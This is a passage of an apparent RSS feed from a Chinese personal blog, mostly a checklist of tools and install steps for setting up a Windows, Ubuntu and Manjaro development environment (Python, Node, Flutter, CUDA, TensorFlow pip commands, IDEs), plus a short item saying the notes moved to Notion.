<h5 id="vscode-666">vscode （666）</h5>
<blockquote>
<p>主要是各种插件</p>
</blockquote>
<ul>
<li>zh-ch （汉化包）</li>
<li>background （右下角小萌人）</li>
<li></li>
</ul>
<h5 id="cmderhttpscmdernet-win下强大的终端工具"><a href="https://cmder.net/">cmder</a> (Win下强大的终端工具)</h5>
<ul>
<li><a href="https://cmder.net/">官网</a>下载安装</li>
<li>简单配置：</li>
<li>wsl vim 无法使用上下左右键解决</li>
</ul>
<h5 id="py2-py3">py2-py3</h5>
<p><a href="https://www.python.org/">官网</a>找想要的包下载，同时装两个版本。</p>
<p>修改环境变量，日常使用py3,把py3的环境变量放在前面，去py2的安装目录复制一份python.exe 更名为python2.exe，就可以使用python2作为命令输入。</p>
<p>pip配置为国内源会快很多</p>
<h5 id="java8jdk最新">Java8+jdk最新</h5>
<p><a href="https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html">官网下载安装</a></p>
<p>下个jdk最新版防止部分工具需要。</p>
<p>可能有时候还需要配置环境变量JAVA_HOME为JDK路径。</p>
<h5 id="golang">Golang</h5>
<p>也是只需<a href="https://golang.google.cn/">下载</a>安装就ok.</p>
<h5 id="nodejs">NodeJS</h5>
<p>也是只需<a href="https://nodejs.org/en/">下载安装</a>就ok. 推荐稳定版。</p>
<p>会默认安装npm，然而下载速度实在太慢，使用淘宝镜像<a href="https://npm.taobao.org/">cnpm</a> ,用法相同</p>
<p><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p>
<h5 id="git">git</h5>
<p><a href="https://git-scm.com/">官网</a>下载安装完事</p>
<h5 id="yarn">Yarn</h5>
<p><a href="https://www.yarnpkg.com/zh-Hant/">官网</a>下载安装完事</p>
<h5 id="cmake">CMake</h5>
<p><a href="https://cmake.org/download/">下载</a>安装ok</p>
<h5 id="hugo-博客工具">hugo (博客工具)</h5>
<p><a href="https://github.com/gohugoio/hugo">下载exe</a>到本地，配置环境变量</p>
<h5 id="haskell-stack">Haskell Stack</h5>
<p><a href="https://docs.haskellstack.org/en/stable/README/#how-to-install">官方文档</a>、win直接下载安装</p>
<h5 id="startlsback-win下的美化工具">StartlsBack (win下的美化工具)</h5>
<p><a href="http://www.cnbigger.com/330.html">下载安装</a> 配置底部透明和居中</p>
<h5 id="notepad-轻便的编辑器">Notepad++ (轻便的编辑器)</h5>
<p><a href="https://notepad-plus-plus.org/">下载安装</a></p>
<h5 id="android-sdk-配置">Android SDK 配置</h5>
<ul>
<li>adb工具 在目录<code>platform-tools</code></li>
<li>emulator、monitor 在<code>tools</code>下</li>
<li>NDK-build  在<code>ndk-bundle</code></li>
</ul>
<h5 id="flutter-google-跨平台框架">flutter (Google 跨平台框架)</h5>
<p>有<a href="https://flutter.dev/">官网</a>了</p>
<p>下载<a href="https://flutter.dev/docs/development/tools/sdk/releases#windows">SDK</a>-&gt;配置环境变量<code> flutter\bin</code> 。添加名为”PUB_HOSTED_URL”和”FLUTTER_STORAGE_BASE_URL”的条目。</p>
<ul>
<li>
<p>Andorid Studio设置</p>
<p>安装插件</p>
<ul>
<li><code>Flutter</code>插件： 支持Flutter开发工作流 (运行、调试、热重载等).</li>
<li><code>Dart</code>插件： 提供代码分析 (输入代码时进行验证、代码补全等).</li>
</ul>
</li>
<li>
<p>VScode设置</p>
<p>安装插件</p>
<ul>
<li><code>flutter</code></li>
</ul>
</li>
</ul>
<h5 id="genymotion逍遥android-android-模拟器">Genymotion+逍遥Android (Android 模拟器)</h5>
<p>下载安装ok</p>
<h5 id="cuda-n卡xxx">CUDA （N卡xxx)</h5>
<ul>
<li>根据自己的显卡官网<a href="https://developer.nvidia.com/cuda-downloads">下载包</a></li>
<li>根据需求安装。</li>
</ul>
<p>有个坑，如果为pytorch 或TensorFlow做前提 先看看这两支持的版本再安装相应的版本。</p>
<h5 id="pytorch">pytorch</h5>
<ul>
<li>需求前置环境也得装好</li>
</ul>
<p><a href="https://pytorch.org/get-started/locally/">官方</a>有很方便的安装方法 根据不同平台和环境</p>
<h5 id="tensorflowhttpwwwbaiducomlinkurlaofeaqzsb4aqhwkb6uuy47eeb5qmtcf0_8xfizfoj8isah2g4usrjsxcv1lxp2nx"><a href="http://www.baidu.com/link?url=AOFeAQZSb4aqHWKb6uUy47eeb5qMTcf0_8xfIZfoJ8iSah2g4UsrjsXcv1lXP2NX">TensorFlow</a></h5>
<ul>
<li>前置环境查官网</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># GPU版本 py3</span>
pip3 install tensorflow-gpu  <span style="color:#75715e"># stable</span>
pip3 install tf-nightly-gpu  <span style="color:#75715e"># preview</span>
pip3 install tensorflow-gpu<span style="color:#f92672">==</span>2.0.0-alpha0 <span style="color:#75715e">##TensorFlow 2.0 Alpha</span>
<span style="color:#75715e"># CPU 版本</span>
pip3 install --user --upgrade tensorflow
</code></pre></div><p><code>tensorflow</code> - 仅支持 CPU 的最新稳定版（建议新手使用）</p>
<p><code>tensorflow-gpu</code> - <a href="https://tensorflow.google.cn/install/gpu">支持 GPU</a> 的最新稳定版（适用于 Ubuntu 和 Windows）</p>
<p><code>tf-nightly</code> - 仅支持 CPU 的预览每夜版（不稳定）</p>
<p><code>tf-nightly-gpu</code> - <a href="https://tensorflow.google.cn/install/gpu">支持 GPU</a> 的预览每夜版（不稳定，适用于 Ubuntu 和 Windows）</p>
<p><code>tensorflow==2.0.0-alpha0</code> - 仅支持 CPU 的预览 TF 2.0 Alpha 版（不稳定）</p>
<p><code>tensorflow-gpu==2.0.0-alpha0</code> - <a href="https://tensorflow.google.cn/install/gpu">支持 GPU</a> 的预览 TF 2.0 Alpha 版（不稳定，Ubuntu 和 Windows）</p>
<h5 id="vmware-pro-虚拟机">VMware pro （虚拟机）</h5>
<ul>
<li>装MacOS记录</li>
</ul>
<h5 id="vbox-虚拟机">VBox （虚拟机）</h5>
<ul>
<li>安装拓展包</li>
</ul>
<h5 id="xshellxftp-free-for-homeschool">Xshell、Xftp (free for Home/School)</h5>
<p>free 的要去<a href="https://www.netsarang.com/zh/free-for-home-school/">官网下载</a> 填写信息，邮箱打开链接下载。</p>
<h5 id="teamviewer-远程连接">TeamViewer (远程连接)</h5>
<h5 id="各种ide集成环境-只记录">各种IDE、集成环境 只记录</h5>
<ul>
<li>Visual Studio 2019</li>
<li>Pycharm</li>
<li>IDEA</li>
<li>微信web开发工具</li>
<li>phpStudy</li>
<li>Android Studio (风扇~~ ~~)</li>
</ul>
<h5 id="other">Other</h5>
<p>不做记录</p>
<h3 id="ubuntu-1804">Ubuntu 18.04</h3>
<blockquote>
<p>一般用来调代码。 大部分配置同上面WSL,只记录不做过多介绍</p>
</blockquote>
<h5 id="on-my-zsh">on my zsh</h5>
<h5 id="gdbpwndbgpedagef">gdb+pwndbg+peda+gef</h5>
<h5 id="美化">美化</h5>
<h3 id="manjaro">manjaro</h3>
<p>很喜欢的Linux发行版。基于<strong>ArchLinux</strong>，软件多，好看又好用。</p>
<h3 id="没钱买mac留记录">没钱买Mac，留记录</h3>
<blockquote>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20190519150336.jpg" alt="穷"></p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>记录汇总(手动置顶)</title>
            <link>https://kuekiko.top/posts/1/01/%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB%E6%89%8B%E5%8A%A8%E7%BD%AE%E9%A1%B6/</link>
            <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
            
            <guid>https://kuekiko.top/posts/1/01/%E8%AE%B0%E5%BD%95%E6%B1%87%E6%80%BB%E6%89%8B%E5%8A%A8%E7%BD%AE%E9%A1%B6/</guid>
            <description>删  重新汇总到 https://www.notion.so/vorblock/da751527312344caace9c3049aae199c</description>
            <content type="html"><![CDATA[<ul>
<li><input checked="" disabled="" type="checkbox"> 删</li>
</ul>
<p>重新汇总到 <a href="https://www.notion.so/vorblock/da751527312344caace9c3049aae199c">https://www.notion.so/vorblock/da751527312344caace9c3049aae199c</a></p>
]]></content>
        </item>
        
    </channel>
</rss>
